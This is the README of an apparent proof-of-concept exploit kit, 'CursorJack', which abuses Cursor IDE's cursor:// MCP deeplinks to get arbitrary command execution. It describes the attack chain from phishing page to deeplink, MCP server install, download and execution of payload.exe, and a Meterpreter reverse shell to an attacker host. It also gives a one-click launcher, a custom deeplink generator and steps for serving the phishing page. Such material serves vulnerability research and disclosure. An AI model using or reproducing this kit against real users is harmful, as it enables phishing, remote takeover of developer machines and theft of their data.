# CursorJack

MCP deeplink exploit for Cursor IDE that achieves arbitrary command execution.

## Attack Flow

1. Victim opens phishing URL → phishing page loads
2. Page triggers `cursor://` deeplink
3. Cursor prompts to install MCP server → victim accepts
4. MCP runs cmd → downloads & executes payload.exe
5. Meterpreter connects back → attacker has full access

## Quick Start

**Requires Linux host with Metasploit (e.g., Kali)**

```bash
chmod +x launch_poc.sh && ./launch_poc.sh
```

The script will:
1. Detect your attacker IP
2. Generate the phishing page with embedded deeplink
3. Build the Meterpreter payload
4. Launch HTTP server and Metasploit handler in tmux

Send `http://{ATTACKER_IP}:8000/index.html` to the victim.

### Stop Services
Open new Terminal and run: `./launch_poc.sh --stop`

---

## Custom Mode Workflow

For using your own custom deeplink:

**1. Create custom deeplink**

The `resources/create_deeplink.py` script generates a deeplink from any MCP configuration JSON file.

```bash
python3 resources/create_deeplink.py my_custom_mcp.json
```

The script takes any MCP JSON file and creates a `cursor://` deeplink for it.

**2. Edit config.env**

```bash
MODE=custom
CURSOR_LINK="cursor://your-generated-deeplink..."
```

**3. Build phishing page**

```bash
python3 resources/build_phishing_page.py
```

**4. Serve manually**

```bash
cd build/webserver && python3 -m http.server 8000
```

---

## Config Options

| Variable | Description |
|----------|-------------|
| `ATTACKER_IP` | Your attacker machine IP |
| `HTTP_PORT` | Web server port (default: 8000) |
| `LPORT` | Meterpreter callback port (default: 4444) |
| `MODE` | `metasploit-poc` or `custom` |
| `CURSOR_LINK` | Custom deeplink (only if MODE=custom) |

---

## Files

| Path | Description |
|------|-------------|
| `launch_poc.sh` | One-click launcher for the PoC |
| `config.env` | Configuration |
| `resources/build_phishing_page.py` | Builds phishing page from templates |
| `resources/create_deeplink.py` | Deeplink generator |
| `resources/victim_cleanup.bat` | Cleanup script for victim machine |
| `templates/mcp.json` | MCP server config template |
| `templates/webserver/` | Phishing page templates |
| `templates/webserver/payload/` | Payload stager (run.bat) |
| `build/` | Generated output (created by build script) |

---
